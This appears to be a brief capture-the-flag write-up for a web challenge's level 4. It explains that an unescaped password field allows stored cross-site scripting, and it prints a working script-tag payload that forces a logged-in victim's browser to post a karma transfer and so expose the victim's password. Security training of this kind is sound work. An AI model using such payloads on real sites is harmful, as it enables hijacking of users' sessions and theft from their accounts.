LEVEL 04
========

params[:password] not escaped and checked
XSS vulnerability, user karma_fountain logs in every minute... use to
send yourself karma to see his password

    <script type='text/javascript'>$.ajax({ url: document.location +
'transfer', type: 'POST', data: { to: 'a', amount: '100' }});</script>.
